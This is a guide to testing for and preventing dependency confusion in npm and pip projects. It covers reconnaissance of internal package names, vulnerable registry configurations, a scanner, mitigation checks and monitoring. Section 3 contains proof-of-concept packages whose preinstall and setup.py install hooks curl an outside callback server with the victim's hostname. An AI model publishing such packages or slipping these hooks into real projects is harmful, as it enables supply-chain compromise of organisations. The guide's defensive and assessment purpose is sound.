# Dependency Confusion Attack Guide

> Techniques for testing dependency confusion vulnerabilities including namespace squatting, internal package hijacking, registry priority exploitation, and automated detection.

---

## 1. Understanding Dependency Confusion

Dependency confusion exploits the way package managers resolve packages when both public and private registries are configured. If an internal package name exists on the public registry with a higher version, the package manager may pull the malicious public version.

```bash
# Identify internal package names from project configuration
# Node.js - check package.json for scoped/unscoped internal packages
cat package.json | jq '.dependencies, .devDependencies' | grep -v "^@" | grep -v "\"[0-9]"

# Python - check requirements.txt and setup.py for internal packages
grep -v "^#" requirements.txt | grep -v "==" | sort
grep "install_requires" setup.py | grep -oP "'[a-z_-]+'"

# Check .npmrc or pip.conf for private registry configuration
cat .npmrc 2>/dev/null
cat ~/.pip/pip.conf 2>/dev/null
cat /etc/pip.conf 2>/dev/null

# Identify packages that DON'T exist on public registries
while read pkg; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$pkg")
  [ "$STATUS" = "404" ] && echo "INTERNAL: $pkg (not on npmjs)"
done < <(jq -r '.dependencies | keys[]' package.json)
```

---

## 2. Namespace Squatting Detection

```python
# Check if internal package names are available on public registries
import requests
import json

def check_npm_availability(package_name):
    resp = requests.get(f"https://registry.npmjs.org/{package_name}")
    return {
        "name": package_name,
        "registry": "npm",
        "exists": resp.status_code == 200,
        "status": resp.status_code,
    }

def check_pypi_availability(package_name):
    resp = requests.get(f"https://pypi.org/pypi/{package_name}/json")
    return {
        "name": package_name,
        "registry": "pypi",
        "exists": resp.status_code == 200,
        "status": resp.status_code,
    }

# Internal packages to check (gathered from project configs)
internal_packages = [
    "company-auth-lib",
    "internal-utils",
    "company-config",
    "shared-models",
]

print("Checking public registry availability:")
for pkg in internal_packages:
    npm_result = check_npm_availability(pkg)
    pypi_result = check_pypi_availability(pkg)
    
    if not npm_result["exists"]:
        print(f"  RISK: '{pkg}' available on npm - could be squatted")
    else:
        print(f"  OCCUPIED: '{pkg}' exists on npm - check if legitimate")
    
    if not pypi_result["exists"]:
        print(f"  RISK: '{pkg}' available on PyPI - could be squatted")
```

---

## 3. Registry Priority Exploitation

```yaml
# Vulnerable .npmrc configuration (no scope pinning)
# This allows public registry to override private packages
registry=https://registry.npmjs.org/
@company:registry=https://npm.company.com/

# PROBLEM: Unscoped packages resolve from public registry first
# If internal package "company-utils" (unscoped) exists on npmjs
# with version 99.0.0, it will be installed over internal 1.2.3
```

```bash
# Test npm resolution order
# Create a test package with high version on public registry
mkdir /tmp/confusion-test && cd /tmp/confusion-test
cat > package.json << 'EOF'
{
  "name": "target-internal-pkg",
  "version": "99.99.99",
  "description": "Dependency confusion test - authorized assessment",
  "scripts": {
    "preinstall": "echo CONFUSION_TEST_TRIGGERED && curl https://assessment-server.com/callback?pkg=$npm_package_name&host=$(hostname)"
  }
}
EOF

# For Python - setup.py with install hook
cat > setup.py << 'EOF'
from setuptools import setup
from setuptools.command.install import install
import os, socket

class CustomInstall(install):
    def run(self):
        # Proof of concept - report back during install
        host = socket.gethostname()
        os.system(f"curl https://assessment-server.com/callback?pkg=target-internal-pkg&host={host}")
        install.run(self)

setup(
    name="target-internal-pkg",
    version="99.99.99",
    description="Dependency confusion test",
    cmdclass={"install": CustomInstall},
)
EOF
```

---

## 4. pip Dependency Confusion

```bash
# Python-specific dependency confusion vectors
# Check pip configuration for registry priority
pip config list | grep index

# Vulnerable pip.conf (extra-index-url does NOT override, it adds)
cat << 'EOF'
[global]
index-url = https://pypi.company.com/simple/
extra-index-url = https://pypi.org/simple/
EOF
# PROBLEM: pip checks BOTH registries and picks highest version

# Safe configuration (only private registry, explicit allowlist for public)
cat << 'EOF'
[global]
index-url = https://pypi.company.com/simple/
# No extra-index-url - public packages mirrored internally
EOF

# Test which registry a package resolves from
pip install --dry-run --verbose target-internal-pkg 2>&1 | grep "Looking in\|Found\|Downloading"
```

```python
# Automated dependency confusion scanner
import requests
import toml
import re
from pathlib import Path

def scan_python_project(project_path):
    """Scan Python project for dependency confusion risks."""
    vulnerabilities = []
    
    # Parse requirements files
    req_files = list(Path(project_path).glob("**/requirements*.txt"))
    for req_file in req_files:
        with open(req_file) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith(("#", "-", "http")):
                    pkg_name = re.split(r'[>=<!\[]', line)[0].strip()
                    # Check if package exists on PyPI
                    resp = requests.get(f"https://pypi.org/pypi/{pkg_name}/json")
                    if resp.status_code == 404:
                        vulnerabilities.append({
                            "package": pkg_name,
                            "file": str(req_file),
                            "risk": "HIGH - not on PyPI, could be squatted",
                        })
                    elif resp.status_code == 200:
                        pypi_data = resp.json()
                        maintainer = pypi_data["info"].get("maintainer_email", "")
                        if "company.com" not in str(maintainer):
                            vulnerabilities.append({
                                "package": pkg_name,
                                "file": str(req_file),
                                "risk": "MEDIUM - exists on PyPI but not owned by org",
                            })
    return vulnerabilities

results = scan_python_project("/path/to/project")
for v in results:
    print(f"[{v['risk']}] {v['package']} in {v['file']}")
```

---

## 5. Mitigation Verification

```bash
# Verify npm scope pinning is correctly configured
# All internal packages should use org scope: @company/package-name
grep -r "require\|import" src/ | grep -v node_modules | grep -v "@company/" | \
  while read line; do
    PKG=$(echo "$line" | grep -oP "from ['\"]([^'\"@./][^'\"]*)" | cut -d'"' -f2 | cut -d"'" -f2)
    [ -n "$PKG" ] && echo "Unscoped import: $line"
  done

# Verify package-lock.json integrity
# Check that resolved URLs point to expected registry
grep "resolved" package-lock.json | grep -v "registry.npmjs.org\|npm.company.com" | head -20

# Verify .npmrc has proper scope configuration
cat .npmrc
# Expected:
# @company:registry=https://npm.company.com/
# //npm.company.com/:_authToken=${NPM_TOKEN}
```

```yaml
# Secure registry configuration checklist
dependency_confusion_prevention:
  npm:
    - use_scoped_packages: "@company/pkg-name"
    - pin_registry_per_scope: true
    - package_lock_committed: true
    - verify_resolved_urls_in_lockfile: true
    
  python:
    - single_index_url: true  # No extra-index-url
    - mirror_public_packages_internally: true
    - hash_pinning_in_requirements: true
    
  general:
    - claim_internal_names_on_public_registries: true
    - version_999_placeholder_on_public: true
    - ci_cd_registry_allowlist: true
    - monitor_new_packages_matching_internal_names: true
```

---

## 6. Automated Monitoring

```bash
# Set up monitoring for new packages matching internal names
# Check daily if someone published packages with your internal names

#!/bin/bash
INTERNAL_PACKAGES="company-auth company-utils internal-config shared-models"
ALERT_WEBHOOK="https://hooks.slack.com/services/xxx/yyy/zzz"

for pkg in $INTERNAL_PACKAGES; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$pkg")
  if [ "$STATUS" = "200" ]; then
    OWNER=$(curl -s "https://registry.npmjs.org/$pkg" | jq -r '.maintainers[0].name')
    if [ "$OWNER" != "company-security" ]; then
      curl -X POST "$ALERT_WEBHOOK" \
        -H "Content-Type: application/json" \
        -d "{\"text\":\"ALERT: Package '$pkg' published on npm by '$OWNER' - possible dependency confusion attack\"}"
    fi
  fi
done
```

Dependency confusion testing must be conducted with explicit authorization. Never publish malicious packages to public registries without coordinated disclosure agreements in place.
